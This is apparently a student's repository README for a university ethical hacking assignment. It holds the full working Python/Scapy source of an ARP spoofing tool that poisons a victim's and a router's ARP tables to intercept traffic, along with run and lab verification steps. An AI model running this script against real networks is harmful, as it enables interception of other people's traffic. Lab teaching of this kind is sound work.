# 🛡️ ARP Spoofer using Scapy | CSCI369 Ethical Hacking Assignment (Q1)

This repository contains a Python-based ARP spoofing tool built as part of the **CSCI369 Ethical Hacking** module (SIM-UOW, S3 2025). The assignment focused on demonstrating a practical **man-in-the-middle (MITM)** attack using **Scapy** in a virtual lab setup involving Kali Linux and Metasploitable2 VMs.

---

## 📘 Assignment Objective

> "Write a Python program that performs an ARP spoofing attack with a single command:  
> `sudo python3 arpspoof.py <Victim_IP> <Router_IP>`  
> The tool must use the `scapy` package (no subprocess or shell commands) and demonstrate a successful ARP spoof against a Metasploitable2 VM when executed from a Kali VM."

---

## 💻 What This Script Does

This Python script performs an ARP spoofing attack using the Scapy library. When run from Kali Linux, it continuously sends fake ARP replies to both a victim machine (e.g., Metasploitable2) and the default gateway (router). The attacker (Kali) pretends to be the router to the victim, and vice versa. This causes both parties to unknowingly send their traffic to the attacker — enabling man-in-the-middle (MITM) attacks. The script takes two IP arguments (victim and router), resolves their MAC addresses, and uses crafted ARP replies to poison their ARP tables. When the user presses CTRL+C, the program automatically sends legitimate ARP replies to restore the original network state. This technique demonstrates a fundamental Layer 2 attack in ethical hacking scenarios.

---

## 🧪 Lab Setup

| VM              | Role      | Example IP   |
|-----------------|-----------|--------------|
| Kali Linux      | Attacker  | 10.0.2.15    |
| Metasploitable2 | Victim    | 10.0.2.4     |
| Router/Gateway  | Router IP | 10.0.2.1     |

---

## 🔧 How to Run

### 💡 Prerequisites
- VirtualBox with **Kali Linux** and **Metasploitable2** VMs
- Both VMs on the **same network** (e.g., NAT or Host-Only)
- Install Scapy on Kali:
  ```bash
  sudo apt update
  sudo apt install python3-scapy
  ```

### ▶️ Execution Command

```bash
sudo python3 arpspoof.py <Victim_IP> <Router_IP>
```

Example:
```bash
sudo python3 arpspoof.py 10.0.2.4 10.0.2.1
```

---

## 🔍 How to Verify the ARP Spoofing Attack

1. **Start the script from Kali**:
   ```bash
   sudo python3 arpspoof.py 10.0.2.4 10.0.2.1
   ```

2. **Switch to Meta2** and run:
   ```bash
   arp -a
   ```

3. Check the entry for the **router IP (e.g. 10.0.2.1)** — it should now point to the **IP address of Kali**, meaning:
   - Meta2 believes the router's IP is located at Kali's MAC

4. To confirm this from Kali, run:
   ```bash
   ifconfig
   ```
   - Get Kali’s IP (e.g. `10.0.2.15`)
   - If Meta2’s ARP table shows `10.0.2.1` → mapped to Kali’s MAC, the spoof worked ✅

5. Press `CTRL+C` in Kali to stop the script — it restores the network.

6. Run `arp -a` again in Meta2 — now the router IP should point back to its original MAC.

---

## 📌 How Did I Find the IPs?

### Victim IP (Meta2):
```bash
ifconfig
```

### Router IP (Default Gateway):
```bash
netstat -rn
```

Look for:
```
Destination   Gateway
0.0.0.0       10.0.2.1
```

---

## 🧠 Optional Learning Tools

- Ping test:
  ```bash
  ping 10.0.2.1  # From Meta2
  ping 10.0.2.4  # From Kali
  ```

---

## 🧾 Reference: Python Source Code (`arpspoof.py`)

```
#!/usr/bin/env python3
# CSCI369 Ethical Hacking Assignment - Q1
# Sheethal Santhanam 2025

from scapy.all import ARP, send, srp, Ether
import sys
import time

# Check for valid input: script requires victim and router IPs
if len(sys.argv) != 3:
    print("Usage: sudo python3 arpspoof.py <Victim_IP> <Router_IP>")
    sys.exit(1)

# Assign victim and router IPs from command line args
victim_ip = sys.argv[1]
router_ip = sys.argv[2]

# Function to resolve MAC address of an IP using ARP request
def get_mac_address(ip):
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_req
    response = srp(arp_broadcast, timeout=2, verbose=False)[0]
    return response[0][1].hwsrc if response else None

# Function to send a spoofed ARP reply to target_ip, pretending to be spoof_ip
def send_spoof_packet(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    if target_mac:
        spoofed_arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(spoofed_arp, verbose=False)
        print(f"[DEBUG] Sent spoofed packet to {target_ip} claiming to be {spoof_ip}")

# Function to restore the real MAC bindings after CTRL+C
def restore_arp_table(destination_ip, source_ip):
    dest_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    correct_arp = ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(correct_arp, count=4, verbose=False)
    print(f"[INFO] Restored ARP for {destination_ip} → {source_ip}")

# Main loop for attack
try:
    print("[+] ARP Spoofing started. Press CTRL+C to stop and restore network.")
    while True:
        send_spoof_packet(victim_ip, router_ip)  # Tell victim we are the router
        send_spoof_packet(router_ip, victim_ip)  # Tell router we are the victim
        time.sleep(2)

# Graceful exit on CTRL+C — restore ARP tables
except KeyboardInterrupt:
    print("\n[!] CTRL+C detected. Restoring network...")
    restore_arp_table(victim_ip, router_ip)
    restore_arp_table(router_ip, victim_ip)
    print("[+] ARP tables restored. Exiting.")

```

---

**Sheethal Santhanam**  
📍 Singapore | SIM-UOW  
🎓 Bachelor of Computer Science  
🛡️ Double Major: Digital Systems Security & Cybersecurity  
📫 [LinkedIn](#) • [Portfolio](#)

---

> 🛑 **Disclaimer**: This project is for educational use only.  
> Never perform ARP spoofing outside a controlled lab environment.
